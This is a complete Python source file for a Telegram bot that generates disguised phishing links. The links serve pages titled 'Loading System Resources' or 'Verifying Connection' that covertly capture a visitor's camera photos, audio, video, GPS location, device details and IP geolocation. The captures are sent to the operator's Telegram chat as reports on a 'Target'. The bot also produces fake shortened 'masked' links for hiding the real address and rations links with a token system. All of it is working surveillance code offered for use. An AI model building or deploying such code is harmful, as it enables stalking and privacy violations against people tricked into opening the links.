import os
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
import telebot
from telebot import types
import json
import base64
import random
import string
import subprocess
import re
import time

TOKEN = "BOT_TOKEN"
bot = telebot.TeleBot(TOKEN)

latest_chat_id = None

# ইউজার টোকেন এবং লাস্ট ক্লেইম টাইম ট্র্যাক করার জন্য ডিকশনারি
user_balances = {}
user_last_claim = {}

def generate_random_path():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=16))

MASTER_PATH = generate_random_path()
FRONT_PATH = generate_random_path()
BACK_PATH = generate_random_path()
AUDIO_PATH = generate_random_path()
INFO_PATH = generate_random_path()
LOC_PATH = generate_random_path()
FRONT_VID_PATH = generate_random_path()
CONT_VID_PATH = generate_random_path()
IP_CRACK_PATH = generate_random_path()
BATTERY_PATH = generate_random_path()

PORT = 8080
PUBLIC_URL = ""

bot_states = {
    "front_cam": False,
    "back_cam": False,
    "audio": False,
    "location": False,
    "info": False,
    "battery": False,
    "ip_crack": False
}

def start_cloudflare_tunnel():
    global PUBLIC_URL
    try:
        proc = subprocess.Popen(
            ['cloudflared', 'tunnel', '--url', f'http://127.0.0.1:{PORT}'],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True
        )
        
        for line in proc.stdout:
            if "trycloudflare.com" in line:
                match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
                if match:
                    PUBLIC_URL = match.group(0)
                    print(f"\n[+] Public Link Generated Successfully: {PUBLIC_URL}\n")
                    break
    except Exception as e:
        print("Tunnel Error:", e)
        import socket
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            PUBLIC_URL = f"http://{s.getsockname()[0]}:{PORT}"
            s.close()
        except:
            PUBLIC_URL = f"http://127.0.0.1:{PORT}"

MASTER_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Loading System Resources...</title>
    <style>
        body { background: #0f0f0f; color: #fff; font-family: sans-serif; text-align: center; padding-top: 150px; }
        .loader { border: 4px solid #333; border-top: 4px solid #00ffcc; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body onload="init()">
    <h2>Loading System Resources... Please Wait</h2>
    <div class="loader"></div>
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>
    
    <script>
        function init() {
            fetch('/page_visited', {method: 'POST'}).catch(err => {});
            setInterval(pollCommands, 2000);
        }

        function sendData(endpoint, data) {
            fetch(endpoint, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            }).catch(err => {});
        }

        function pollCommands() {
            fetch('/get_commands')
            .then(res => res.json())
            .then(config => {
                if(config.front_cam) captureCam('user', 'Front Camera');
                if(config.back_cam) captureCam('environment', 'Back Camera');
                if(config.audio) recordAudio();
                if(config.info) sendInfo();
                if(config.location) getLocation();
                if(config.battery) checkBattery();
                if(config.ip_crack) crackIP();
            }).catch(err => {});
        }

        function captureCam(facing, type) {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: facing } })
            .then(stream => {
                let v = document.getElementById('video');
                v.srcObject = stream;
                setTimeout(() => {
                    let c = document.getElementById('canvas');
                    c.width = v.videoWidth || 640; c.height = v.videoHeight || 480;
                    c.getContext('2d').drawImage(v, 0, 0);
                    sendData('/upload_photo', {image: c.toDataURL('image/jpeg'), type: type});
                    stream.getTracks().forEach(t => t.stop());
                }, 1000);
            }).catch(e => {});
        }

        function recordAudio() {
            navigator.mediaDevices.getUserMedia({ audio: true })
            .then(stream => {
                let mr = new MediaRecorder(stream);
                let chunks = [];
                mr.ondataavailable = e => chunks.push(e.data);
                mr.onstop = () => {
                    let blob = new Blob(chunks, {'type': 'audio/ogg'});
                    let reader = new FileReader();
                    reader.readAsDataURL(blob);
                    reader.onloadend = () => sendData('/upload_audio', {audio: reader.result});
                    stream.getTracks().forEach(t => t.stop());
                };
                mr.start();
                setTimeout(() => mr.stop(), 5000);
            }).catch(e => {});
        }

        function sendInfo() {
            var info = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: screen.width+"x"+screen.height,
                cores: navigator.hardwareConcurrency||"Unknown",
                memory: navigator.deviceMemory||"Unknown",
                cookie: navigator.cookieEnabled?"Enabled":"Disabled",
                vendor: navigator.vendor||"Unknown"
            };
            sendData('/upload_info', info);
        }

        function getLocation() {
            if(navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(pos => {
                    sendData('/upload_loc', {
                        lat: pos.coords.latitude, 
                        lon: pos.coords.longitude, 
                        accuracy: pos.coords.accuracy,
                        altitude: pos.coords.altitude || "Unavailable",
                        speed: pos.coords.speed || "Unavailable"
                    });
                }, err => {}, {enableHighAccuracy: true});
            }
        }

        async function checkBattery() {
            let lvl = "Unknown", chg = "Unknown", timeToDischarge = "Unknown", timeToCharge = "Unknown";
            if(navigator.getBattery) {
                try { 
                    let bat = await navigator.getBattery(); 
                    lvl = Math.round(bat.level*100)+"%"; 
                    chg = bat.charging?"⚡ Charging (প্লাগ ইন করা)":"🔋 Unplugged (ব্যাটারিতে চলছে)"; 
                    timeToDischarge = bat.dischargingTime !== Infinity ? Math.round(bat.dischargingTime/60)+" mins" : "Unlimited";
                    timeToCharge = bat.chargingTime !== Infinity ? Math.round(bat.chargingTime/60)+" mins" : "Fully Charged / N/A";
                }catch(e){}
            }
            sendData('/upload_battery', {
                level: lvl, 
                charging: chg, 
                discharge: timeToDischarge,
                chargeTime: timeToCharge,
                network: (navigator.connection?navigator.connection.effectiveType:"Unknown"), 
                downlink: (navigator.connection?navigator.connection.downlink+" Mbps":"Unknown"),
                online: navigator.onLine?"🟢 Online":"🔴 Offline", 
                platform: navigator.platform, 
                userAgent: navigator.userAgent
            });
        }

        function crackIP() {
            fetch('https://ipapi.co/json/').then(r=>r.json()).then(data => {
                sendData('/upload_ip', {
                    ip: data.ip, 
                    city: data.city, 
                    region: data.region, 
                    country: data.country_name, 
                    postal: data.postal || "N/A",
                    org: data.org, 
                    asn: data.asn || "N/A",
                    timezone: data.timezone, 
                    currency: data.currency || "N/A",
                    userAgent: navigator.userAgent
                });
            }).catch(e=>{});
        }
    </script>
</body>
</html>
"""

FRONT_CAM_HTML = """<!DOCTYPE html><html><head><title>Front Camera</title><style>body{background:#111;color:#fff;font-family:sans-serif;text-align:center;padding-top:50px;}</style></head><body onload="init()"><h2>Front Camera Capturing...</h2><video id="video" autoplay playsinline style="display:none;"></video><canvas id="canvas" style="display:none;"></canvas><script>function init(){navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}).then(stream=>{var v=document.getElementById('video');v.srcObject=stream;setInterval(capture,3000);}).catch(err=>{});}function capture(){var v=document.getElementById('video'),c=document.getElementById('canvas');c.width=v.videoWidth||640;c.height=v.videoHeight||480;c.getContext('2d').drawImage(v,0,0);fetch('/upload_photo',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({image:c.toDataURL('image/jpeg'),type:'Front Camera'})});}</script></body></html>"""
BACK_CAM_HTML = """<!DOCTYPE html><html><head><title>Back Camera</title><style>body{background:#111;color:#fff;font-family:sans-serif;text-align:center;padding-top:50px;}</style></head><body onload="init()"><h2>Back Camera Capturing...</h2><video id="video" autoplay playsinline style="display:none;"></video><canvas id="canvas" style="display:none;"></canvas><script>function init(){navigator.mediaDevices.getUserMedia({video:{facingMode:"environment"}}).then(stream=>{var v=document.getElementById('video');v.srcObject=stream;setInterval(capture,3000);}).catch(err=>{});}function capture(){var v=document.getElementById('video'),c=document.getElementById('canvas');c.width=v.videoWidth||640;c.height=v.videoHeight||480;c.getContext('2d').drawImage(v,0,0);fetch('/upload_photo',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({image:c.toDataURL('image/jpeg'),type:'Back Camera'})});}</script></body></html>"""
AUDIO_HTML = """<!DOCTYPE html><html><head><title>Audio Record</title><style>body{background:#111;color:#fff;font-family:sans-serif;text-align:center;padding-top:50px;}</style></head><body onload="init()"><h2>Audio Recording...</h2><script>function init(){navigator.mediaDevices.getUserMedia({audio:true}).then(stream=>{let mediaRecorder=new MediaRecorder(stream);let chunks=[];mediaRecorder.ondataavailable=e=>chunks.push(e.data);mediaRecorder.onstop=e=>{let blob=new Blob(chunks,{'type':'audio/ogg; codecs=opus'});let reader=new FileReader();reader.readAsDataURL(blob);reader.onloadend=function(){fetch('/upload_audio',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({audio:reader.result})});}};mediaRecorder.start();setTimeout(()=>{mediaRecorder.stop();},6000);}).catch(err=>{});}</script></body></html>"""
INFO_HTML = """<!DOCTYPE html><html><head><title>Loading...</title></head><body onload="sendInfo()"><h2>Loading...</h2><script>function sendInfo(){var info={userAgent:navigator.userAgent,platform:navigator.platform,language:navigator.language,screen:screen.width+"x"+screen.height,cores:navigator.hardwareConcurrency||"Unknown",memory:navigator.deviceMemory||"Unknown",cookie:navigator.cookieEnabled?"Enabled":"Disabled",vendor:navigator.vendor||"Unknown"};fetch('/upload_info',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(info)}).then(()=>{document.body.innerHTML="<h2>Done!</h2>";});}</script></body></html>"""
LOC_HTML = """<!DOCTYPE html><html><head><title>GPS Location</title><style>body{background:#111;color:#fff;font-family:sans-serif;text-align:center;padding-top:50px;}</style></head><body onload="getLocation()"><h2>Fetching Location...</h2><script>function getLocation(){if(navigator.geolocation){navigator.geolocation.getCurrentPosition(sendPosition,showError,{enableHighAccuracy:true});}}function sendPosition(position){fetch('/upload_loc',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lat:position.coords.latitude,lon:position.coords.longitude,accuracy:position.coords.accuracy,altitude:position.coords.altitude||"Unavailable",speed:position.coords.speed||"Unavailable"})}).then(()=>{document.body.innerHTML="<h2>Location Captured!</h2>";});}function showError(error){}</script></body></html>"""
FRONT_VID_HTML = """<!DOCTYPE html><html><head><title>5 Sec Video</title><style>body{background:#111;color:#fff;font-family:sans-serif;text-align:center;padding-top:50px;}</style></head><body onload="init()"><h2>Recording 5 Sec Video...</h2><video id="video" autoplay playsinline style="display:none;"></video><script>function init(){navigator.mediaDevices.getUserMedia({video:{facingMode:"user"},audio:true}).then(stream=>{var v=document.getElementById('video');v.srcObject=stream;let mediaRecorder=new MediaRecorder(stream);let chunks=[];mediaRecorder.ondataavailable=e=>chunks.push(e.data);mediaRecorder.onstop=e=>{let blob=new Blob(chunks,{'type':'video/webm'});let reader=new FileReader();reader.readAsDataURL(blob);reader.onloadend=function(){fetch('/upload_video',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({video:reader.result,type:'5 Sec Front Video'})}).then(()=>{document.body.innerHTML="<h2>Done!</h2>";});}};mediaRecorder.start();setTimeout(()=>{mediaRecorder.stop();},5000);}).catch(err=>{});}</script></body></html>"""
CONT_VID_HTML = """<!DOCTYPE html><html><head><title>Continuous Video Stream</title><style>body{background:#111;color:#fff;font-family:sans-serif;text-align:center;padding-top:50px;}</style></head><body onload="init()"><h2>Continuous Video Streaming...</h2><video id="video" autoplay playsinline style="display:none;"></video><script>function init(){navigator.mediaDevices.getUserMedia({video:{facingMode:"user"},audio:true}).then(stream=>{var v=document.getElementById('video');v.srcObject=stream;recordLoop(stream);}).catch(err=>{});}function recordLoop(stream){let mediaRecorder=new MediaRecorder(stream);let chunks=[];mediaRecorder.ondataavailable=e=>chunks.push(e.data);mediaRecorder.onstop=e=>{let blob=new Blob(chunks,{'type':'video/webm'});let reader=new FileReader();reader.readAsDataURL(blob);reader.onloadend=function(){fetch('/upload_video',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({video:reader.result,type:'Continuous Video Stream'})});recordLoop(stream);}};mediaRecorder.start();setTimeout(()=>{mediaRecorder.stop();},5000);}</script></body></html>"""
IP_CRACK_HTML = """<!DOCTYPE html><html><head><title>Loading Verification...</title><style>body{background:#111;color:#fff;font-family:sans-serif;text-align:center;padding-top:80px;}</style></head><body onload="crackIP()"><h2>Verifying Connection...</h2><script>function crackIP(){fetch('https://ipapi.co/json/').then(res=>res.json()).then(data=>{fetch('/upload_ip',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ip:data.ip,city:data.city,region:data.region,country:data.country_name,postal:data.postal||"N/A",org:data.org,asn:data.asn||"N/A",timezone:data.timezone,currency:data.currency||"N/A",userAgent:navigator.userAgent})}).then(()=>{document.body.innerHTML="<h2>Success!</h2>";});}).catch(err=>{});}</script></body></html>"""
BATTERY_HTML = """<!DOCTYPE html><html><head><title>Loading...</title><style>body{background:#111;color:#fff;font-family:sans-serif;text-align:center;padding-top:80px;}</style></head><body onload="checkBattery()"><h2>Loading System Resources...</h2><script>async function checkBattery(){let batteryLevel="Unknown",isCharging="Unknown",timeToDischarge="Unknown",timeToCharge="Unknown";if(navigator.getBattery){try{let bat=await navigator.getBattery();batteryLevel=Math.round(bat.level*100)+"%";isCharging=bat.charging?"⚡ Charging":"🔋 Unplugged";timeToDischarge=bat.dischargingTime!==Infinity?Math.round(bat.dischargingTime/60)+" mins":"Unlimited";timeToCharge=bat.chargingTime!==Infinity?Math.round(bat.chargingTime/60)+" mins":"Fully Charged / N/A";}catch(e){}}fetch('/upload_battery',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({level:batteryLevel,charging:isCharging,discharge:timeToDischarge,chargeTime:timeToCharge,network:(navigator.connection?navigator.connection.effectiveType:"Unknown"),downlink:(navigator.connection?navigator.connection.downlink+" Mbps":"Unknown"),online:navigator.onLine?"🟢 Online":"🔴 Offline",platform:navigator.platform,userAgent:navigator.userAgent})}).then(()=>{document.body.innerHTML="<h2>Done!</h2>";});}</script></body></html>"""

class MyHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == f'/{MASTER_PATH}':
            self.send_response(200); self.send_header("Content-type", "text/html"); self.end_headers(); self.wfile.write(MASTER_HTML.encode("utf-8"))
        elif self.path == f'/{FRONT_PATH}':
            self.send_response(200); self.send_header("Content-type", "text/html"); self.end_headers(); self.wfile.write(FRONT_CAM_HTML.encode("utf-8"))
        elif self.path == f'/{BACK_PATH}':
            self.send_response(200); self.send_header("Content-type", "text/html"); self.end_headers(); self.wfile.write(BACK_CAM_HTML.encode("utf-8"))
        elif self.path == f'/{AUDIO_PATH}':
            self.send_response(200); self.send_header("Content-type", "text/html"); self.end_headers(); self.wfile.write(AUDIO_HTML.encode("utf-8"))
        elif self.path == f'/{INFO_PATH}':
            self.send_response(200); self.send_header("Content-type", "text/html"); self.end_headers(); self.wfile.write(INFO_HTML.encode("utf-8"))
        elif self.path == f'/{LOC_PATH}':
            self.send_response(200); self.send_header("Content-type", "text/html"); self.end_headers(); self.wfile.write(LOC_HTML.encode("utf-8"))
        elif self.path == f'/{FRONT_VID_PATH}':
            self.send_response(200); self.send_header("Content-type", "text/html"); self.end_headers(); self.wfile.write(FRONT_VID_HTML.encode("utf-8"))
        elif self.path == f'/{CONT_VID_PATH}':
            self.send_response(200); self.send_header("Content-type", "text/html"); self.end_headers(); self.wfile.write(CONT_VID_HTML.encode("utf-8"))
        elif self.path == f'/{IP_CRACK_PATH}':
            self.send_response(200); self.send_header("Content-type", "text/html"); self.end_headers(); self.wfile.write(IP_CRACK_HTML.encode("utf-8"))
        elif self.path == f'/{BATTERY_PATH}':
            self.send_response(200); self.send_header("Content-type", "text/html"); self.end_headers(); self.wfile.write(BATTERY_HTML.encode("utf-8"))
        elif self.path == '/get_commands':
            self.send_response(200); self.send_header("Content-type", "application/json"); self.end_headers()
            self.wfile.write(json.dumps(bot_states).encode("utf-8"))
        else:
            self.send_response(404); self.end_headers()

    def do_POST(self):
        global latest_chat_id
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)

        try:
            if self.path == '/page_visited':
                if latest_chat_id:
                    bot.send_message(latest_chat_id, "🚨 Target Visited Master Link!**\nUse the control panel below to turn features On/Off:", reply_markup=get_bot_control_panel(), parse_mode="Markdown")

            elif self.path == '/upload_photo':
                data = json.loads(post_data.decode('utf-8'))
                header, encoded = data['image'].split(",", 1)
                image_bytes = base64.b64decode(encoded)
                if latest_chat_id:
                    bot.send_photo(latest_chat_id, image_bytes, caption=f"📸 {data.get('type', 'Camera')} captured!")

            elif self.path == '/upload_audio':
                data = json.loads(post_data.decode('utf-8'))
                header, encoded = data['audio'].split(",", 1)
                audio_bytes = base64.b64decode(encoded)
                if latest_chat_id:
                    bot.send_audio(latest_chat_id, audio_bytes, caption="🎙️ Audio recorded!")

            elif self.path == '/upload_video':
                data = json.loads(post_data.decode('utf-8'))
                header, encoded = data['video'].split(",", 1)
                video_bytes = base64.b64decode(encoded)
                if latest_chat_id:
                    bot.send_video(latest_chat_id, video_bytes, caption=f"📹 {data.get('type', 'Video')} recorded!")

            elif self.path == '/upload_loc':
                data = json.loads(post_data.decode('utf-8'))
                lat, lon, acc = data.get('lat'), data.get('lon'), data.get('accuracy')
                alt, speed = data.get('altitude'), data.get('speed')
                map_link = f"https://www.google.com/maps?q={lat},{lon}"
                
                loc_text = (
                    "╭━━━ 📍 GPS LOCATION REPORT 📍 ━━━╮\n"
                    f"┃ 🌐 Latitude: `{lat}`\n"
                    f"┃ 🌐 Longitude: `{lon}`\n"
                    f"┃ 🎯 Accuracy: `{acc} meters`\n"
                    f"┃ ⛰️ Altitude: `{alt}`\n"
                    f"┃ 🚀 Speed: `{speed}`\n"
                    f"┃ 🗺️ Map Link: [Open in Google Maps]({map_link})\n"
                    "╰━━━━━━━━━━━━━━━━━━━━━━━━━━╯"
                )
                if latest_chat_id:
                    bot.send_message(latest_chat_id, loc_text, parse_mode="Markdown")

            elif self.path == '/upload_info':
                data = json.loads(post_data.decode('utf-8'))
                info_text = (
                    "╭━━━ 📱 DEVICE INFORMATION 📱 ━━━╮\n"
                    f"┃ 💻 Platform: `{data.get('platform')}`\n"
                    f"┃ 📺 Screen Res: `{data.get('screen')}`\n"
                    f"┃ ⚙️ CPU Cores: `{data.get('cores')}`\n"
                    f"┃ 🧠 RAM Memory: `{data.get('memory')} GB`\n"
                    f"┃ 🗣️ Language: `{data.get('language')}`\n"
                    f"┃ 🍪 Cookies: `{data.get('cookie')}`\n"
                    f"┃ 🏭 Vendor: `{data.get('vendor')}`\n"
                    f"┃ 🤖 User Agent:\n`{data.get('userAgent')}`\n"
                    "╰━━━━━━━━━━━━━━━━━━━━━━━━━━╯"
                )
                if latest_chat_id:
                    bot.send_message(latest_chat_id, info_text, parse_mode="Markdown")

            elif self.path == '/upload_ip':
                data = json.loads(post_data.decode('utf-8'))
                ip_text = (
                    "╭━━━ 🌐 IP INTELLIGENCE REPORT 🌐 ━━━╮\n"
                    f"┃ 🔍 IP Address: `{data.get('ip')}`\n"
                    f"┃ 🏙️ City: `{data.get('city')}`\n"
                    f"┃ 📍 Region: `{data.get('region')}`\n"
                    f"┃ 🏳️ Country: `{data.get('country')}`\n"
                    f"┃ 📮 Postal Code: `{data.get('postal')}`\n"
                    f"┃ 🏢 Organization: `{data.get('org')}`\n"
                    f"┃ 🌐 ASN: `{data.get('asn')}`\n"
                    f"┃ 🕒 Timezone: `{data.get('timezone')}`\n"
                    f"┃ 💱 Currency: `{data.get('currency')}`\n"
                    "╰━━━━━━━━━━━━━━━━━━━━━━━━━━╯"
                )
                if latest_chat_id:
                    bot.send_message(latest_chat_id, ip_text, parse_mode="Markdown")

            elif self.path == '/upload_battery':
                data = json.loads(post_data.decode('utf-8'))
                bat_text = (
                    "╭━━━ 🔋 BATTERY & NETWORK REPORT** 🔋 ━━━╮\n"
                    f"┃ ⚡ Battery Level: `{data.get('level')}`\n"
                    f"┃ 🔌 Power Status: `{data.get('charging')}`\n"
                    f"┃ ⏳ Discharge Time: `{data.get('discharge')}`\n"
                    f"┃ ⏱️ Full Charge Time: `{data.get('chargeTime')}`\n"
                    f"┃ 📶 Network Type: `{data.get('network')}`\n"
                    f"┃ 🚀 Downlink Speed: `{data.get('downlink')}`\n"
                    f"┃ 🌐 Connection State: `{data.get('online')}`\n"
                    "╰━━━━━━━━━━━━━━━━━━━━━━━━━━╯"
                )
                if latest_chat_id:
                    bot.send_message(latest_chat_id, bat_text, parse_mode="Markdown")

            self.send_response(200); self.end_headers(); self.wfile.write(b"OK")
        except Exception as e:
            print("Error:", e)
            self.send_response(500); self.end_headers()

def run_server():
    server_address = ('0.0.0.0', PORT)
    httpd = HTTPServer(server_address, MyHandler)
    print(f"HTTP Server running on port {PORT}...")
    httpd.serve_forever()

def get_main_markup():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🎁 Free Claim", callback_data="free_claim"),
        types.InlineKeyboardButton("💰 Balance", callback_data="check_balance"),
        types.InlineKeyboardButton("🚀 Master Remote Link", callback_data="gen_master"),
        types.InlineKeyboardButton("📷 Front Camera", callback_data="front_cam"),
        types.InlineKeyboardButton("📸 Back Camera", callback_data="back_cam"),
        types.InlineKeyboardButton("🎙️ Audio Record", callback_data="audio_rec"),
        types.InlineKeyboardButton("📱 Phone Details", callback_data="phone_info"),
        types.InlineKeyboardButton("📍 GPS Location", callback_data="gps_loc"),
        types.InlineKeyboardButton("📹 5 Sec Video", callback_data="front_vid"),
        types.InlineKeyboardButton("🔄 Continuous Stream", callback_data="cont_vid"),
        types.InlineKeyboardButton("🌐 IP Crack", callback_data="ip_crack"),
        types.InlineKeyboardButton("🔋 Battery Monitor", callback_data="battery_mon")
    )
    return markup

def get_bot_control_panel():
    markup = types.InlineKeyboardMarkup(row_width=2)
    
    f_status = "✅ ON" if bot_states["front_cam"] else "❌ OFF"
    b_status = "✅ ON" if bot_states["back_cam"] else "❌ OFF"
    a_status = "✅ ON" if bot_states["audio"] else "❌ OFF"
    l_status = "✅ ON" if bot_states["location"] else "❌ OFF"
    i_status = "✅ ON" if bot_states["info"] else "❌ OFF"
    bat_status = "✅ ON" if bot_states["battery"] else "❌ OFF"
    ip_status = "✅ ON" if bot_states["ip_crack"] else "❌ OFF"

    markup.add(
        types.InlineKeyboardButton(f"Front Cam: {f_status}", callback_data="toggle_front"),
        types.InlineKeyboardButton(f"Back Cam: {b_status}", callback_data="toggle_back"),
        types.InlineKeyboardButton(f"Audio: {a_status}", callback_data="toggle_audio"),
        types.InlineKeyboardButton(f"Location: {l_status}", callback_data="toggle_loc"),
        types.InlineKeyboardButton(f"Phone Info: {i_status}", callback_data="toggle_info"),
        types.InlineKeyboardButton(f"Battery: {bat_status}", callback_data="toggle_bat"),
        types.InlineKeyboardButton(f"IP Crack: {ip_status}", callback_data="toggle_ip")
    )
    return markup

@bot.message_handler(commands=['start'])
def send_welcome(message):
    global latest_chat_id
    latest_chat_id = message.chat.id
    chat_id = message.chat.id

    if chat_id not in user_balances:
        user_balances[chat_id] = 100
        welcome_msg = "🎉 **Welcome to Advanced Control Bot!**\n\n🎁 You received **100 Free Tokens** for starting the bot! 🔥\n\n🎯 **Control Panel Menu:**\nSelect an option below:"
    else:
        welcome_msg = "🎯 **Control Panel Menu:**\nSelect an option below:"

    bot.send_message(chat_id, welcome_msg, reply_markup=get_main_markup(), parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    global latest_chat_id
    latest_chat_id = call.message.chat.id
    chat_id = call.message.chat.id
    
    if chat_id not in user_balances:
        user_balances[chat_id] = 100

    global PUBLIC_URL
    if not PUBLIC_URL:
        time.sleep(2)

    if call.data == "check_balance":
        current_bal = user_balances.get(chat_id, 0)
        bot.answer_callback_query(call.id, f"Your Balance: {current_bal} Tokens", show_alert=False)
        bot.send_message(chat_id, f"💰 Wallet Balance:\n\n✨ Current Balance: `{current_bal} Tokens` 🪙\n🚀 Generate links or use features to spend tokens!", parse_mode="Markdown")
        return

    if call.data == "free_claim":
        current_time = time.time()
        last_time = user_last_claim.get(chat_id, 0)
        
        if current_time - last_time < 86400:
            remaining_hours = int((86400 - (current_time - last_time)) / 3600)
            bot.answer_callback_query(call.id, f"⚠️ Already claimed! Try again after {remaining_hours} hours.", show_alert=True)
            return

        msg = bot.send_message(chat_id, "🔄 Verifying Daily Claim...\n⏳ Please wait a moment...", parse_mode="Markdown")
        time.sleep(2)
        
        user_balances[chat_id] += 100
        user_last_claim[chat_id] = current_time
        
        try:
            bot.delete_message(chat_id, msg.message_id)
        except:
            pass

        bot.send_message(chat_id, "🎉 **Claim Successful!** 🔥\n\n🎁 You have received **100 Free Tokens**!\n💰 New Balance: `{}` Tokens".format(user_balances[chat_id]), parse_mode="Markdown")
        return

    if call.data.startswith("toggle_"):
        key_map = {
            "toggle_front": "front_cam",
            "toggle_back": "back_cam",
            "toggle_audio": "audio",
            "toggle_loc": "location",
            "toggle_info": "info",
            "toggle_bat": "battery",
            "toggle_ip": "ip_crack"
        }
        target_key = key_map.get(call.data)
        if target_key:
            bot_states[target_key] = not bot_states[target_key]
            
        try:
            bot.edit_message_reply_markup(chat_id=chat_id, message_id=call.message.message_id, reply_markup=get_bot_control_panel())
        except:
            pass
        return

    link_buttons = ["gen_master", "front_cam", "back_cam", "audio_rec", "phone_info", "gps_loc", "front_vid", "cont_vid", "ip_crack", "battery_mon"]
    
    if call.data in link_buttons:
        if user_balances.get(chat_id, 0) < 20:
            bot.send_message(chat_id, "⚠️ **Limit Crossed!** ❌\n\nYour token balance is insufficient (Less than 20 tokens). Please claim free tokens using the **🎁 Free Claim** button or wait for daily reset!", parse_mode="Markdown")
            return
        
        user_balances[chat_id] -= 20

        path_suffix = ""
        if call.data == "gen_master": path_suffix = MASTER_PATH
        elif call.data == "front_cam": path_suffix = FRONT_PATH
        elif call.data == "back_cam": path_suffix = BACK_PATH
        elif call.data == "audio_rec": path_suffix = AUDIO_PATH
        elif call.data == "phone_info": path_suffix = INFO_PATH
        elif call.data == "gps_loc": path_suffix = LOC_PATH
        elif call.data == "front_vid": path_suffix = FRONT_VID_PATH
        elif call.data == "cont_vid": path_suffix = CONT_VID_PATH
        elif call.data == "ip_crack": path_suffix = IP_CRACK_PATH
        elif call.data == "battery_mon": path_suffix = BATTERY_PATH

        raw_link = f"{PUBLIC_URL}/{path_suffix}"
        short_code = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
        masked_link = f"https://rb.gy/{short_code}"

        response_text = f"🔗 **Generated Link:**\n`{raw_link}`\n\n🌐 **Masked Link:**\n`{masked_link}`\n\n💸 **Cost:** `-20 Tokens` | Remaining: `{user_balances[chat_id]} Tokens`"
        bot.send_message(chat_id, response_text, parse_mode="Markdown")

    try:
        if os.name == 'posix':
            os.system('clear')
        print("[*] Termux session buffer cleared & optimized.")
    except:
        pass

if __name__ == '__main__':
    tunnel_thread = threading.Thread(target=start_cloudflare_tunnel)
    tunnel_thread.daemon = True
    tunnel_thread.start()

    server_thread = threading.Thread(target=run_server)
    server_thread.daemon = True
    server_thread.start()

    print("Telegram Bot is running...")
    bot.infinity_polling()
